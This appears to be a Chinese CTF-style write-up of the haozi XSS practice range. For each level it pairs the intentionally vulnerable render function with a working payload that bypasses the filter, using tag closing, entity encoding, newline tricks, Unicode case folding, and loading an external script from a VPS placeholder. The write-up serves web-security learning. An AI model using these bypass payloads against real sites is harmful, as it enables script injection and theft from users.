---
title: haozi_XSS靶场通关记录
tags: XSS
typora-root-url: ../
---

#### 前言

XSS平台：https://xss.haozi.me/

Github：https://github.com/haozi/xss-demo

<!--more-->

#### writeup

##### 0x00

```javascript
// server code
function render (input) {
  return '<div>' + input + '</div>'
}
```

```javascript
// input code
<script>alert(1)</script>

// 常见payload
```

##### 0x01

```javascript
// server code
function render (input) {
  return '<textarea>' + input + '</textarea>'
}
```

```javascript
// input code
</textarea><script>alert(1)</script><textarea>

// 在textarea内需闭合textarea标签
```

##### 0x02

```javascript
// server code
function render (input) {
  return '<input type="name" value="' + input + '">'

```

```javascript
//input code
"><script>alert(1)</script>"

// 在value值中需">进行闭合
```

##### 0x03

```javascript
// server code
function render (input) {
  const stripBracketsRe = /[()]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

```javascript
// input code
<script>alert`1`</script>

// g全局匹配，“[()]”替换为空，用``代替
```

##### 0x04

```javascript
// server code
function render (input) {
  const stripBracketsRe = /[()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

```javascript
// input code
<img src=x onerror=alert&#x28;&#x31;&#x29;>

// g全局匹配，“[()`]”替换为空,进行实体编码绕过
```

##### 0x05

```javascript
// server code
function render (input) {
  input = input.replace(/-->/g, '😂')
  return '<!-- ' + input + ' -->'
}
```

```javascript
// input code
--!>
<img src=x onerror=alert(1)>
<!--

// g全局匹配，“-->”替换为😂
// 注释有两种<!-- 注释 -->、<!-- 注释 --!>
```



##### 0x06

```javascript
// server code
function render (input) {
  input = input.replace(/auto|on.*=|>/ig, '_')
  return `<input value=1 ${input} type="text">`
}
```

```javascript
// input code
onmousemove
=alert(1)

// ig全局匹配并忽略大小写,正则匹配“auto|on.*=|>”替换为_
// 没有匹配换行可进行换行绕过，插入后需移动鼠标
// onmousemove 鼠标被移动,可参考：https://www.runoob.com/jsref/dom-obj-event.html
```

##### 0x07

```javascript
// server code
function render (input) {
  const stripTagsRe = /<\/?[^>]+>/gi

  input = input.replace(stripTagsRe, '')
  return `<article>${input}</article>`
}
```

```javascript
// input code
<img src=x onerror=alert(1)
     
// ig全局匹配并忽略大小写，正则匹配"<\/?[^>]+>"替换为空
// 回车自动补全
```

##### 0x08

```javascript
// server code
function render (src) {
  src = src.replace(/<\/style>/ig, '/* \u574F\u4EBA */')
  return `
    <style>
      ${src}
    </style>
  `
}
```

```javascript
// input code
</style
>
<img src=x onerror=alert(1)>

// ig全局匹配并忽略大小写，匹配“</style>”替换为/* 坏人 */
// 利用换行绕过匹配
```

##### 0x09

```javascript
// server code
function render (input) {
  let domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${input}"></script>`
  }
  return 'Invalid URL'
}
```

```javascript
// input code
http://www.segmentfault.com" ></script><img src=x onerror=alert(1)>

// 匹配输入的是否存在"http://www.segmentfault.com"
```

##### 0x0A

```javascript
// server code
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f')
  }

  const domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${escapeHtml(input)}"></script>`
  }
  return 'Invalid URL'
}
```

```javascript
// input code
https://www.segmentfault.com@xss.haozi.me/j.js

// 这里引入一个靶场自身站点下的js文件（多次尝试无果，最后使用的火狐浏览器）
```

注解：

chrome浏览器因为弃用了一些@嵌入式的一些请求，所以使用了火狐浏览器做这道题。

![image-20200513100657413](/img/haozi_XSS靶场通关记录/image-20200513100657413.png)

自己搭建VPS需支持HTTPS请求否则无法加载js

```javascript
// input code
https://www.segmentfault.com@vps地址/xss.js
```

非要使用HTTP，需在about:config配置文件中将修改security.mixed_content.block_active_content为false，不然会出现混合活动内容

![image-20200513101558581](/img/haozi_XSS靶场通关记录/image-20200513101558581.png)

```javascript
// input code
http://www.segmentfault.com@vps地址/xss.js
```

![image-20200513093911763](/img/haozi_XSS靶场通关记录/image-20200513093911763.png)

##### 0x0B

```javascript
// server code
function render (input) {
  input = input.toUpperCase()
  return `<h1>${input}</h1>`
}
```

```javascript
// input code
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

// 将输入的字符串转换成大写
// HTML不区分大小写，JavaScript区分大小写；JavaScript是一种区分大小写的语言，对变量方法的命名有严格的大小写敏感。
// js函数进行Unicode编码
```

##### 0x0C

```javascript
// server code
function render (input) {
  input = input.replace(/script/ig, '')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

```javascript
// input code
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

// 将输入的字符串转换成大写并不区分大小写匹配“script”替换为空
// js函数进行Unicode编码或进行双写绕过
```

##### 0x0D

```javascript
// server code
function render (input) {
  input = input.replace(/[</"']/g, '')
  return `
    <script>
          // alert('${input}')
    </script>
  `
}
```

```javascript
// input code
			//这里有个换行
alert(1)
-->

// 利用换行逃逸注释,利用html的"-->"注释掉后面字符
```

##### 0x0E

```javascript
// server code
function render (input) {
  input = input.replace(/<([a-zA-Z])/g, '<_$1')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

```javascript
<ſcript src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;></script>

// 古英文字符ſ大写后为S（ſ不等于s）
// 脑洞题
// 如果使用加载外部js文件需注意是否区分大小写
```

##### 0x0F

```javascript
// server code
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f;')
  }
  return `<img src onerror="console.error('${escapeHtml(input)}')">`
}
```

```javascript
// input code
');alert(1) //

// 浏览器会先解析html,然后再解析js,实体编码了也可以正常解析进行闭合后插入alert,注释后面字符
```

##### 0x10

```javascript
// server code
function render (input) {
  return `
<script>
  window.data = ${input}
</script>
  `
}
```

```javascript
//input code
"";alert(1)

// 闭合或传值;再进行插入alert
```

##### 0x11

```javascript
// server code
// from alf.nu
function render (s) {
  function escapeJs (s) {
    return String(s)
            .replace(/\\/g, '\\\\')
            .replace(/'/g, '\\\'')
            .replace(/"/g, '\\"')
            .replace(/`/g, '\\`')
            .replace(/</g, '\\74')
            .replace(/>/g, '\\76')
            .replace(/\//g, '\\/')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\t/g, '\\t')
            .replace(/\f/g, '\\f')
            .replace(/\v/g, '\\v')
            // .replace(/\b/g, '\\b')
            .replace(/\0/g, '\\0')
  }
  s = escapeJs(s)
  return `
<script>
  var url = 'javascript:console.log("${s}")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>
`
}
```

```javascript
// input code
");alert(1)//

// "\/\/"转义在js中还是注释
```

```javascript
// input code
");alert(1)("

// 转义后还是",进行闭合前后的内容
```

注解：

```javascript
// input code
");alert(1)("

// html
<script>
  var url = 'javascript:console.log("\");alert(1)(\"")'
  var a = document.createElement('a') // 创建一个新的元素
  a.href = url //<a> 标签的 href 属性用于指定超链接目标的 URL
  document.body.appendChild(a) // 在节点的子节点列表末添加新的子节点
  a.click() //触发点击事件
</script>
```

![image-20200515101607256](/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200515101607256.png)

\"进行转义后还是"

在 JavaScript 中使用反斜杠来向文本字符串添加特殊字符时都可以使用反斜杠来添加到文本字符串中

可参考：https://www.w3school.com.cn/js/js_special_characters.asp

##### 0x12

```javascript
// server code
// from alf.nu
function escape (s) {
  s = s.replace(/"/g, '\\"')
  return '<script>console.log("' + s + '");</script>'
}
```

```javascript
// input code
</script> <script>alert(1)</script><script>

// 只过滤一次，内嵌一个script
```

```javascript
// input code
\");
alert(1);
//

// "被转义成\"经过解析后，变成 console.log("\") 会报语法错误, 再补个 \ 即可
```

![image-20200513182714494](/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200513182714494.png)

#### 最后

payload并不唯一，有多种解法，这里不一一叙述，如有错误还请斧正。

haozi开放式答案：https://github.com/haozi/xss-demo/issues/1

